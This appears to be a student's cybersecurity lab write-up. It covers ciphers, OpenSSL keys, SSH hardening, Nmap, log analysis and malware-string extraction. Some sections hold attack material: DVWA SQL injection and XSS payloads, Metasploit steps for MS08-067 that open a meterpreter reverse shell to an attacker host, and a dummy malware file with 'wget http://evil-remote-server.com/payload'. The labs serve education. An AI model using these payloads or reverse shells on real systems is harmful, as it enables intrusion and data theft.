#  **Cybersecurity Assignment**

## 1. **Caesar Cipher**

**Encrypt "HELLO" → "LIPPS"** and decrypt ciphertext with Python.

```python
def caesar(text, shift):
    result = ""
    for ch in text:
        if ch.isalpha():
            result += chr(ord(ch) + shift)
        else:
            result += ch
    return result

# Usage
choice = input("Enter choice (encrypt / decrypt): ")
text = input("Enter text: ")
shift = int(input("Enter shift value: "))

if choice == "encrypt":
    print("Encrypted:", caesar(text, shift))
elif choice == "decrypt":
    print("Decrypted:", caesar(text, -shift))
```

**Example:** `HELLO` + shift 4 → `LIPPS`
**Output:**

<img width="428" height="88" alt="image" src="https://github.com/user-attachments/assets/64be2fba-a8b2-4c95-b8aa-bbc0f9435fa5" />

***

## 2. **RSA Keys (OpenSSL)**

**Generate 2048-bit RSA key pair** in **PEM format** (Windows).

```cmd
"C:\Program Files\OpenSSL-Win64\bin\openssl.exe" version
"C:\Program Files\OpenSSL-Win64\bin\openssl.exe" genrsa -out private_key.pem 2048
"C:\Program Files\OpenSSL-Win64\bin\openssl.exe" rsa -in private_key.pem -pubout -out public_key.pem
type private_key.pem
type public_key.pem
```

**PEM Format:** `-----BEGIN RSA PRIVATE KEY-----` + Base64 + `-----END-----`
**Output:**
<img width="796" height="691" alt="image" src="https://github.com/user-attachments/assets/308ba14c-285a-4e15-ba6d-5ee6280f02d1" />

<img width="799" height="266" alt="image" src="https://github.com/user-attachments/assets/521ab839-f2e0-4466-953a-7eddc5fee28a" />

***

## 3. **Linux User Permissions**

**Create 2 users** - only `person1` accesses `secure.txt`.

```bash
sudo useradd person1 && sudo passwd person1  # password: person1
sudo useradd person2 && sudo passwd person2  # password: person2
touch secure.txt
sudo chown person1:person1 secure.txt
chmod 600 secure.txt
ls -l  # -rw------- 1 person1 person1

su person1  # cat/nano works
su person2  # Permission denied!

```
**Output:**

<img width="298" height="224" alt="image" src="https://github.com/user-attachments/assets/159c9eac-cf83-488a-ba19-789d5af52089" />
***


***

## 4. **Disable SSH Root**

**Prevent root brute-force attacks**.

```bash
sudo nano /etc/ssh/sshd_config
# PermitRootLogin no

sudo systemctl restart ssh
sudo sshd -T | grep permitrootlogin  # permitrootlogin no
ssh root@your_server_ip  # Permission denied!
```
**Output:**

<img width="396" height="270" alt="image" src="https://github.com/user-attachments/assets/efcb9be7-a47a-4a45-9843-f638eaae1b08" />

***

## 5. **OpenVPN Setup**

**Connect VPNBook** - verify IP change.

```bash
curl ifconfig.me  # Real IP
sudo apt install openvpn -y
cd ~/Downloads/vpnbook-openvpn-fr200
sudo openvpn vpnbook-fr200-tcp80.ovpn  # vpnbook/[password from vpnbook.com]
# NEW terminal:
curl ifconfig.me  # France IP!
```

***

## 6. **Nmap Port Scanning**

**Scan `scanme.nmap.org`** - identify services.

```bash
nmap scanme.nmap.org
# 22/tcp open  ssh     (Secure Shell)
# 80/tcp open  http    (Web server)  
# 9929/tcp open nping-echo
```
**Output:**

<img width="646" height="363" alt="image" src="https://github.com/user-attachments/assets/c2bd70a3-3c09-4947-afac-c16325941407" />

***

## 7. **DVWA SQL Injection**

**Setup DVWA** → **Extract all users**.

```bash
# Install + Setup (see full steps above)
sudo git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
# Database: user=dvwa, pass=p@ssw0rd
# Firefox: http://localhost/dvwa

# Attack (Low security):
User ID: 1' OR '1'='1  # Dumps ALL users!
```
**Output:**

<img width="492" height="357" alt="image" src="https://github.com/user-attachments/assets/dfcf1002-d230-4cc1-819e-e51f7aabaf9d" />


<img width="460" height="406" alt="image" src="https://github.com/user-attachments/assets/4c504304-4b80-4d0d-9c19-f522b9504c01" />

***

## 8. **DVWA XSS Attack**

**Inject JavaScript** in reflected XSS.

```
DVWA → XSS (Reflected) → Low
Name: <script>alert('XSS');</script>
# Popup: XSS  ✅
```

<img width="502" height="200" alt="image" src="https://github.com/user-attachments/assets/f18c7998-f563-49a5-82cc-96d0697b1244" />

***

## 9. **Domain Analysis**

**Whois + DNS lookup**.

```bash
whois example.com
# Domain: EXAMPLE.COM, Created: 1995-08-14

nslookup example.com
# Address: 93.184.216.34

nslookup
> set type=NS
> example.com  # Name servers
> exit
```

<img width="637" height="415" alt="image" src="https://github.com/user-attachments/assets/9c1127f3-a1d7-4853-a723-5597555880ca" />


<img width="419" height="232" alt="image" src="https://github.com/user-attachments/assets/677061be-d9e3-4dd0-9983-be6676582b86" />   

***

**10.Exploiting MS08-067 using Metasploit:**

Start Metasploit:
msfconsole

Search for the MS08-067 exploit module:
search ms08_067

Select the exploit:
use exploit/windows/smb/ms08_067_netapi

View required options:
show options

Set the target IP address:
set RHOSTS <Target_Windows_XP_IP>

Set attacker IP address:
set LHOST <Kali_IP>

Select payload:
set PAYLOAD windows/meterpreter/reverse_tcp

Launch the exploit:
exploit
***

## 11. **Malware Strings**

**Extract C2 servers** from malware.

```bash
cat << 'EOF' > dummy_malware.bin
http://malicious-website.com/command
powershell -nop -w hidden -c Invoke-WebRequest
wget http://evil-remote-server.com/payload
192.168.0.10
EOF

strings dummy_malware.bin | grep http  # C2 URLs
strings dummy_malware.bin | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'  # IPs
```

**Findings:** `malicious-website.com`, `192.168.0.10`

<img width="607" height="432" alt="image" src="https://github.com/user-attachments/assets/680ff83b-3a31-4385-bbaf-0a2aaee6b938" />

***

**12.Malware Analysis Using Sandbox and Process Monitor:**

1. Start Process Monitoring
procmon.exe

2. Take Initial Registry Snapshot
regshot.exe

3. Execute Malware Sample (Test File)
sample.exe

4.Take Second Registry Snapshot
regshot.exe

5.Monitor Network Activity
wireshark.exe

Filter:
ip.addr == <VM_IP>

6.Check Created or Modified Files
dir /s /b C:\ | findstr sample.exe

7. Check Persistence in Startup Registry
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

8. View Active Connections
netstat -ano

9. View Running Processes
tasklist

***


## 13. **Breach Simulation**

**Malicious script** + **auditd tracking**.

```bash
nano breach.sh  # Creates files in /tmp
chmod +x breach.sh
sudo apt install auditd -y
sudo auditctl -w /tmp -p war -k breach_monitor
./breach.sh
sudo ausearch -k breach_monitor
ls /tmp  # secret_data.txt, hidden_folder
```

<img width="1136" height="768" alt="image" src="https://github.com/user-attachments/assets/7fffcf6e-d142-4ab3-a155-1341e47426de" />


<img width="697" height="223" alt="image" src="https://github.com/user-attachments/assets/de86c3be-dc31-44e3-bbb6-c26765035d48" />

***

## 14. **SSH Log Analysis**

**Detect brute-force attacks**.

```bash
sudo journalctl _COMM=sshd | grep "Failed password" | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort | uniq -c | sort -nr
# 47 192.168.1.100  ← BLOCK THIS!
```

<img width="1089" height="579" alt="image" src="https://github.com/user-attachments/assets/3f6527fc-d8ca-476c-b524-3e092b52162d" />

**Failed Login Attempts:**

<img width="867" height="363" alt="image" src="https://github.com/user-attachments/assets/a3bae6c8-8433-4ccd-b9c9-98a74d452349" />

**Failed User Attempts:**

<img width="691" height="141" alt="image" src="https://github.com/user-attachments/assets/4aa066f5-58d7-49b4-9864-8db954def7ea" />

**Extract timestamp + IP:**

<img width="701" height="352" alt="image" src="https://github.com/user-attachments/assets/817a2f15-cc99-4fbe-9e7e-46ac0ed8fb9c" />

**Count repeated IPs:**

<img width="1017" height="78" alt="image" src="https://github.com/user-attachments/assets/e4161cdd-e554-4776-8121-d1b3d8db3ef3" />


***

## 15. **AWS EC2 Security**

**Security Group:** HTTP(80) + SSH(22) **only**.

```
Inbound Rules:
✓ HTTP 80   0.0.0.0/0
✓ SSH  22   0.0.0.0/0
✗ All others BLOCKED

nmap your-ec2-ip  # Only 22,80 open
```

<img width="497" height="428" alt="image" src="https://github.com/user-attachments/assets/35f500b5-8982-4be1-99a2-b13913ebdea8" />


<img width="547" height="168" alt="image" src="https://github.com/user-attachments/assets/8f5fe1ff-f2e1-4fda-9fa3-31991a34ae73" />

***

## 16. **IoT Wireshark**

**RPi + ESP32** → **Unsecured HTTP/UDP** captured.

```
ESP32: HTTP api.ipify.org  (Plaintext!)
RPi:  UDP broadcast        (No encryption!)
Wireshark: wlan0mon filter "http or udp"
```

***

## 🎯 **Summary**

| Lab | Skill | Key Command |
|-----|-------|-------------|
| Caesar | Cryptography | `caesar(text, 4)` |
| RSA | PKI | `openssl genrsa` |
| Permissions | Linux | `chmod 600` |
| SSH | Hardening | `PermitRootLogin no` |
| VPN | Networking | `openvpn .ovpn` |
| Nmap | Recon | `nmap scanme.nmap.org` |
| SQLi | Web | `1' OR '1'='1` |
| XSS | Web | `<script>alert('XSS')</script>` |
| Whois | OSINT | `whois example.com` |
| Strings | Malware | `strings malware.bin \| grep http` |
| Audit | Forensics | `ausearch -k breach` |
| Logs | SIEM | `journalctl \| grep Failed` |
| AWS | Cloud | Security Groups |
| IoT | Analysis | `wireshark wlan0mon` |
